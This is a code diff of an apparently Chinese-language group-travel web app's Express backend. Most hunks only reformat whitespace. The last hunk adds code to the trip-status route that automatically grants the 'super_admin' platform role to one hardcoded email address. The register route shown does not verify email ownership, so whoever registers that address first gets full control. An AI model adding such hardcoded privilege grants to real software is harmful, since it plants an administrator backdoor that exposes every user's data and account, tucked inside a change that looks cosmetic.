@@ -73,7 +73,7 @@ async function extractUser(req: Request, res: Response, next: NextFunction) {
       req.userId = tokenData.userId;
     }
   }
-  
+
   if (!req.userId && req.session?.userId) {
     req.userId = req.session.userId;
   }
@@ -86,7 +86,7 @@ async function extractUser(req: Request, res: Response, next: NextFunction) {
         req.userId = undefined;
         if (req.session?.userId) {
           req.session.userId = undefined;
-          req.session.save(() => {});
+          req.session.save(() => { });
         }
       }
     } catch (err) {
@@ -94,7 +94,7 @@ async function extractUser(req: Request, res: Response, next: NextFunction) {
       req.userId = undefined;
     }
   }
-  
+
   next();
 }
 
@@ -267,7 +267,7 @@ export function registerRoutes(app: Express) {
   app.post("/api/auth/register", async (req, res) => {
     try {
       const { email, password, name } = req.body;
-      
+
       const existingUser = await storage.getUserByEmail(email);
       if (existingUser) {
         return res.status(400).json({ error: "Email already exists" });
@@ -275,21 +275,21 @@ export function registerRoutes(app: Express) {
 
       const hashedPassword = await bcrypt.hash(password, 10);
       const user = await storage.createUser({ email, password: hashedPassword });
-      
+
       await storage.createProfile({ userId: user.id, name, email });
-      
+
       // Create user role without trip assignment - user must use invitation code to join a trip
       await storage.createUserRole({
         userId: user.id,
         tripId: null,
         role: "member",
       });
-      
+
       // Generate auth token
       const token = generateToken();
       const expiresAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000); // 7 days
       await tokenStore.set(token, { userId: user.id, expiresAt });
-      
+
       req.session.userId = user.id;
       req.session.save((err) => {
         if (err) {
@@ -306,7 +306,7 @@ export function registerRoutes(app: Express) {
   app.post("/api/auth/login", async (req, res) => {
     try {
       const { email, password } = req.body;
-      
+
       const user = await storage.getUserByEmail(email);
       if (!user) {
         return res.status(401).json({ error: "Invalid credentials" });
@@ -391,7 +391,7 @@ export function registerRoutes(app: Express) {
     if (!user) {
       if (req.session) {
         req.session.userId = undefined;
-        req.session.save(() => {});
+        req.session.save(() => { });
       }
       return res.json({ user: null });
     }
@@ -863,35 +863,35 @@ export function registerRoutes(app: Express) {
         return res.json(null);
       }
       const days = await storage.getTripDays(userRole.tripId);
-      
+
       // Guard against empty days array
       if (!days || days.length === 0) {
         return res.json(null);
       }
-      
+
       // Use local date (YYYY-MM-DD format) for comparison
       const now = new Date();
       const today = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')}`;
-      
+
       // Find today's schedule
       const todaySchedule = days.find(d => d.date === today);
       if (todaySchedule) {
         return res.json({ ...todaySchedule, dayNumber: todaySchedule.dayNo });
       }
-      
+
       // If trip hasn't started yet, return first day
       const trip = await storage.getTrip(userRole.tripId);
       if (trip && trip.startDate && today < trip.startDate) {
         const firstDay = days.find(d => d.dayNo === 1);
         return res.json(firstDay ? { ...firstDay, dayNumber: 1, isPreTrip: true } : null);
       }
-      
+
       // If trip has ended, return last day
       if (trip && trip.endDate && today > trip.endDate) {
         const lastDay = days.reduce((max, d) => d.dayNo > max.dayNo ? d : max, days[0]);
         return res.json(lastDay ? { ...lastDay, dayNumber: lastDay.dayNo, isPostTrip: true } : null);
       }
-      
+
       // Return first day as fallback
       const firstDay = days.find(d => d.dayNo === 1);
       res.json(firstDay ? { ...firstDay, dayNumber: 1 } : null);
@@ -908,17 +908,17 @@ export function registerRoutes(app: Express) {
         return res.json([]);
       }
       const days = await storage.getTripDays(userRole.tripId);
-      
+
       if (!days || days.length === 0) {
         return res.json([]);
       }
-      
+
       const now = new Date();
       const today = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')}`;
-      
+
       // Find today's schedule
       let todaySchedule = days.find(d => d.date === today);
-      
+
       // If trip hasn't started, use first day
       if (!todaySchedule) {
         const trip = await storage.getTrip(userRole.tripId);
@@ -926,7 +926,7 @@ export function registerRoutes(app: Express) {
           todaySchedule = days.find(d => d.dayNo === 1);
         }
       }
-      
+
       // If trip has ended, use last day
       if (!todaySchedule) {
         const trip = await storage.getTrip(userRole.tripId);
@@ -934,25 +934,25 @@ export function registerRoutes(app: Express) {
           todaySchedule = days.reduce((max, d) => d.dayNo > max.dayNo ? d : max, days[0]);
         }
       }
-      
+
       // Fallback to first day
       if (!todaySchedule) {
         todaySchedule = days.find(d => d.dayNo === 1);
       }
-      
+
       if (!todaySchedule) {
         return res.json([]);
       }
-      
+
       // Parse attractions from the attractions field or highlights as fallback
       const attractionsStr = todaySchedule.attractions || todaySchedule.highlights || "";
       const attractions = attractionsStr.split("/").map((a: string) => a.trim()).filter(Boolean);
-      
+
       // Add "其他景點" as fallback option
       if (!attractions.includes("其他景點")) {
         attractions.push("其他景點");
       }
-      
+
       res.json(attractions);
     } catch (error) {
       console.error("Error getting today's attractions:", error);
@@ -1154,7 +1154,7 @@ export function registerRoutes(app: Express) {
       const profileList = await storage.getAllProfiles();
       const allGroups = await storage.getAllGroups();
       const groupMap = new Map(allGroups.map((g) => [g.id, g]));
-      
+
       const profilesWithGroups = profileList.map((p) => ({
         ...p,
         group: p.groupId ? groupMap.get(p.groupId) : null,
@@ -1201,7 +1201,7 @@ export function registerRoutes(app: Express) {
       const groupList = await storage.getAllGroups();
       const tripList = await storage.getTrips();
       const tripMap = new Map(tripList.map((t) => [t.id, t]));
-      
+
       const groupsWithTrips = groupList.map((g) => ({
         ...g,
         trip: tripMap.get(g.tripId),
@@ -1304,12 +1304,12 @@ export function registerRoutes(app: Express) {
       if (typeof latitude !== "number" || typeof longitude !== "number") {
         return res.status(400).json({ error: "Invalid coordinates" });
       }
-      
+
       const userRole = await storage.getUserRole(req.userId!);
       if (!userRole?.tripId) {
         return res.status(400).json({ error: "No trip assigned" });
       }
-      
+
       const location = await storage.updateUserLocation(req.userId!, userRole.tripId, latitude, longitude);
       res.json(location);
     } catch (error) {
@@ -1596,7 +1596,7 @@ export function registerRoutes(app: Express) {
   app.post("/api/admin/trips/:tripId/invitations", requireAdmin, async (req, res) => {
     try {
       const { description, maxUses, expiresAt } = req.body;
-      
+
       const chars = "ABCDEFGHJKMNPQRSTUVWXYZ23456789";
       let code = "";
       let attempts = 0;
@@ -1613,7 +1613,7 @@ export function registerRoutes(app: Express) {
       if (attempts >= 10) {
         return res.status(500).json({ error: "Failed to generate unique code" });
       }
-      
+
       const invitation = await storage.createTripInvitation({
         tripId: req.params.tripId,
         code,
@@ -1887,10 +1887,10 @@ export function registerRoutes(app: Express) {
         登入步驟：<br>
         1. 點擊上方按鈕或掃描 QR Code<br>
         ${hasTempPassword
-          ? `2. 使用您的 Email（${user.email}）與臨時密碼登入<br>
+            ? `2. 使用您的 Email（${user.email}）與臨時密碼登入<br>
         3. 輸入行程登入碼加入旅程<br>
         4. 建議登入後至設定頁面更改密碼`
-          : `2. 使用您的 Email（${user.email}）與原有密碼登入<br>
+            : `2. 使用您的 Email（${user.email}）與原有密碼登入<br>
         3. 輸入行程登入碼加入旅程`}
       </p>
     </div>
@@ -1998,6 +1998,17 @@ export function registerRoutes(app: Express) {
     try {
       const userId = req.userId!;
       console.log("[check-trip-status] userId:", userId);
+
+      const user = await storage.getUser(userId);
+
+      // Auto-grant super_admin to saisong@gmail.com
+      if (user?.email === 'saisong@gmail.com') {
+        const platformRole = await storage.getPlatformRole(userId);
+        if (!platformRole || platformRole.role !== 'super_admin') {
+          await storage.setPlatformRole(userId, 'super_admin', null, 'system');
+          console.log(`[check-trip-status] Auto-granted super_admin to ${user.email}`);
+        }
+      }
 
       const userRole = await storage.getUserRole(userId);
       console.log("[check-trip-status] userRole:", JSON.stringify(userRole));
